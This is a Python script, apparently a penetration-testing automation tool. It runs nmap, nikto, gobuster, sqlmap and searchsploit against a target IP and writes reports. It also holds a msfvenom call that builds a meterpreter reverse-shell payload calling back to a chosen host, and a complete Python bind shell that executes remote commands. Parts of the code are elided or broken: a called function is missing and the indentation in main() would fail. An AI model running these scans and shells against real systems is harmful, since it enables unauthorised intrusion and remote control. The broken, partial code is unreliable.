import os
import subprocess
import shlex
import json
from datetime import datetime
import re
import argparse
from bs4 import BeautifulSoup  # For HTML parsing (if needed)
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, ListFlowable  # For PDF
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.units import inch

# ... (Scanner modules - same as before, improve parsing as needed) ...
def nmap_scan(ip):
    try:
        print(f"[+] Running Nmap scan against {ip}...")
        nmap_output = subprocess.run(shlex.split(f"nmap -A -T4 {ip}"), capture_output=True, text=True).stdout
        # (Improve parsing as needed - Example below)
        nmap_findings = []
        for line in nmap_output.splitlines():
            if "open" in line and "tcp" in line:  # Example: Find open TCP ports
                port = line.split("/")[0]
                nmap_findings.append({"type": "open_tcp_port", "port": port})
        return nmap_output, nmap_findings  # Return raw output and parsed findings

    except Exception as e:
        print(f"[-] Nmap scan error: {e}")
        return None, []

def nikto_scan(ip):
    try:
        print(f"[+] Running Nikto scan against {ip}...")
        nikto_output = subprocess.run(shlex.split(f"nikto -h {ip}"), capture_output=True, text=True).stdout
        # (Improve parsing as needed)
        nikto_findings = []
        for line in nikto_output.splitlines():
            if "+" in line and "Vulnerability" in line: # Example: Check for vulnerability findings
                vulnerability = line.split("+")[1].strip()
                nikto_findings.append({"type": "nikto_vulnerability", "description": vulnerability})
        return nikto_output, nikto_findings
    except Exception as e:
        print(f"[-] Nikto scan error: {e}")
        return None, []
def gobuster_scan(ip):
    try:
        print(f"[+] Running Gobuster scan against {ip}...")
        gobuster_output = subprocess.run(
            shlex.split(f"gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt"),
            capture_output=True, text=True).stdout

        gobuster_findings = []
        for line in gobuster_output.splitlines():
            if "Status:" in line: # Check for directories found
                directory = line.split(" ")[0]
                status_code = line.split(" ")[2].replace("[","").replace("]","")
                gobuster_findings.append({"type": "directory_found", "directory": directory, "status_code": status_code})
        return gobuster_output, gobuster_findings
    except Exception as e:
        print(f"[-] Gobuster scan error: {e}")
        return None, []

def sqlmap_scan(ip):
    try:
        print(f"[+] Running SQLMap scan against {ip}...")

        # Improved SQLMap command (add --batch and other options as needed)
        sqlmap_output = subprocess.run(
            shlex.split(f"sqlmap -u http://{ip} --batch --dbs --level=1 --risk=1"),  # Adjust level/risk as needed
            capture_output=True, text=True).stdout

        sqlmap_findings = []
        if "available databases" in sqlmap_output:  # Look for databases
            databases_match = re.search(r"available databases(.*?)\[\d+\]", sqlmap_output, re.DOTALL)
            if databases_match:
                databases = databases_match.group(1).strip().split("\n")
                for db in databases:
                    sqlmap_findings.append({"type": "sql_database_found", "database": db.strip()})
        # Add more logic to extract other findings (tables, columns, etc.)

        return sqlmap_output, sqlmap_findings

    except Exception as e:
        print(f"[-] SQLMap scan error: {e}")
        return None, []

def searchsploit_search(keyword):
    try:
        print(f"[+] Searching Exploit-DB for '{keyword}'...")
        searchsploit_output = subprocess.run(
            shlex.split(f"searchsploit {keyword}"), capture_output=True, text=True).stdout

        searchsploit_findings = []
        for line in searchsploit_output.splitlines():
            if "|" in line and "EDB-ID" not in line and "DESCRIPTION" not in line: # Check for exploits
                parts = line.split("|")
                edb_id = parts[1].strip()
                description = parts[2].strip()
                searchsploit_findings.append({"type": "exploit_found", "edb_id": edb_id, "description": description})
        return searchsploit_output, searchsploit_findings

    except Exception as e:
        print(f"[-] Searchsploit error: {e}")
        return None, []

# ... (Shellcode generation - same as before) ...
def generate_reverse_shell(ip, port):
    # Use msfvenom (or other shellcode generators)
    try:
        shellcode = subprocess.run(
            shlex.split(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f python"), # Example
            capture_output=True, text=True).stdout
        return shellcode

    except Exception as e:
        print(f"[-] Reverse shell generation error: {e}")
        return None

def generate_bind_shell(port):
    # Example (simple bind shell - improve for security)
    shellcode = f"""
import socket, subprocess, os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.bind(('0.0.0.0', {port}));
s.listen(1);
conn, addr=s.accept();
while 1:
    command=conn.recv(1024).decode();
    if command == "exit":
        break;
    proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);
    stdout_value=proc.stdout.read()+proc.stderr.read();
    conn.send(stdout_value);
conn.close();
"""
    return shellcode

# --- Reporting Module ---

def generate_report(target_info, findings, output_format="txt"):  # Add format option
    try:
        if output_format == "txt":
            report_content = generate_text_report(target_info, findings)
            filename = "pentest_report.txt"
        elif output_format == "html":
            report_content = generate_html_report(target_info, findings)
            filename = "pentest_report.html"
        elif output_format == "pdf":
            generate_pdf_report(target_info, findings)  # Separate PDF generation
            return  # PDF is handled directly
        else:
            raise ValueError("Invalid report format")

        with open(filename, "w") as f:
            f.write(report_content)
        print(f"[+] Report generated as {filename}")

    except Exception as e:
        print(f"[-] Report generation error: {e}")


def generate_text_report(target_info, findings):
    report_content = f"Penetration Testing Report - {datetime.now()}\n\n"
    # ... (rest of the text report generation - same as before)
    return report_content

def generate_html_report(target_info, findings):
    report_content = f"""
    <html>
    <head><title>Penetration Testing Report</title></head>
    <body>
    <h1>Penetration Testing Report - {datetime.now()}</h1>
    <h2>Target: {target_info['ip']} ({target_info['website'] or 'N/A'})</h2>
    """

    if findings:
        report_content += "<h2>Identified Vulnerabilities:</h2><ul>"
        for finding in findings:
            report_content += f"<li><b>Type:</b> {finding['type']}<br>"
            # ... (add other details: port, description, CVE, etc.) ...
            report_content += "</li>"  # Close the list item
        report_content += "</ul>"
    else:
        report_content += "<p>No vulnerabilities identified.</p>"

    report_content += """
    <h2>Recommendations:</h2>
    <ul>
        <li>Perform manual verification of findings.</li>
        <li>Consult security best practices for remediation.</li>
        <li>Prioritize patching high-severity vulnerabilities.</li>
        <li>Use Metasploit (or other tools) for manual exploitation (if appropriate and with permission).</li>
    </ul>
    </body></html>
    """
    return report_content

def generate_pdf_report(target_info, findings):  # PDF Generation
    try:
        doc = SimpleDocTemplate("pentest_report.pdf")
        styles = getSampleStyleSheet()
        story = []

        story.append(Paragraph(f"Penetration Testing Report - {datetime.now()}", styles['h1']))
        story.append(Paragraph(f"Target: {target_info['ip']} ({target_info['website'] or 'N/A'})", styles['h2']))
        story.append(Spacer(1, 0.2*inch))  # Add some space

        if findings:
            story.append(Paragraph("Identified Vulnerabilities:", styles['h3']))
            vulnerability_list = ListFlowable([], style=styles['BULLET'])  # Use a list for vulnerabilities
            for finding in findings:
                vulnerability_details = f"<b>Type:</b> {finding['type']}<br>"
                # ... (Add other details) ...
                vulnerability_list.add(Paragraph(vulnerability_details, styles['Normal']))  # Add each vulnerability
            story.append(vulnerability_list)

        else:
            story.append(Paragraph("No vulnerabilities identified.", styles['Normal']))

        story.append(Paragraph("Recommendations:", styles['h3']))
        recommendations = [
            "Perform manual verification of findings.",
            "Consult security best practices for remediation.",
            "Prioritize patching high-severity vulnerabilities.",
            "Use Metasploit (or other tools) for manual exploitation (if appropriate and with permission)."
        ]
        recommendation_list = ListFlowable([], style=styles['BULLET'])
        for recommendation in recommendations:
            recommendation_list.add(Paragraph(recommendation, styles['Normal']))
        story.append(recommendation_list)

        doc.build(story)
        print("[+] Report generated as pentest_report.pdf")

    except Exception as e:
        print(f"[-] PDF report generation error: {e}")


# --- Main Function ---

def main():
    # ... (Argument parsing - same as before) 

    # ... (Scanner calls - same as before)
  parser = argparse.ArgumentParser(description="Penetration Testing Script")

    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-w", "--website", help="Target website (optional)")

    # Scanner options
    parser.add_argument("--nmap", action="store_true", help="Enable Nmap scan")
    parser.add_argument("--nikto", action="store_true", help="Enable Nikto scan")
    parser.add_argument("--gobuster", action="store_true", help="Enable Gobuster scan")
    parser.add_argument("--sqlmap", action="store_true", help="Enable SQLMap scan")
    parser.add_argument("--searchsploit", help="Searchsploit keyword (optional)")

    # Shellcode options
    parser.add_argument("--reverse-shell", action="store_true", help="Generate reverse shell")
    parser.add_argument("--bind-shell", action="store_true", help="Generate bind shell")
    parser.add_argument("--lhost", help="LHOST for reverse shell")
    parser.add_argument("--lport", type=int, help="LPORT for reverse/bind shell")

    args = parser.parse_args()

    ip = args.ip
    website = args.website or get_website_from_ip(ip) # if website is not given then it will try to get the website from ip address using get_website_from_ip function
    target_info = {"ip": ip, "website": website}

    all_findings = []

    if args.nmap:
        nmap_output, nmap_findings = nmap_scan(ip)
        if nmap_findings:
            all_findings.extend(nmap_findings)

    if args.nikto:
        nikto_output, nikto_findings = nikto_scan(ip)
        if nikto_findings:
            all_findings.extend(nikto_findings)

    if args.gobuster:
        gobuster_output, gobuster_findings = gobuster_scan(ip)
        if gobuster_findings:
            all_findings.extend(gobuster_findings)

    if args.sqlmap:
        sqlmap_output, sqlmap_findings = sqlmap_scan(ip)
        if sqlmap_findings:
            all_findings.extend(sqlmap_findings)

    if args.searchsploit:
        searchsploit_output, searchsploit_findings = searchsploit_search(args.searchsploit)
        if searchsploit_findings:
            all_findings.extend(searchsploit_findings)

    if args.reverse_shell:
        if not args.lhost or not args.lport:
            print("[-] LHOST and LPORT are required for reverse shell.")
        else:
            reverse_shell_code = generate_reverse_shell(args.lhost, args.lport)
            if reverse_shell_code:
                print(f"[+] Reverse shell code:\n{reverse_shell_code}")

    if args.bind_shell:
        if not args.lport:
            print("[-] LPORT is required for bind shell.")
        else:
            bind_shell_code = generate_bind_shell(args.lport)
            if bind_shell_code:
                print(f"[+] Bind shell code:\n{bind_shell_code}")



    report_format = input("Choose report format (txt, html, pdf): ").lower()  # Get format from user
    generate_report(target_info, all_findings, report_format)  # Pass the format

    # ... (Ethical reminders - same as before)

if __name__ == "__main__":
    main()

# ... (get_website_from_ip function - same as before) ...
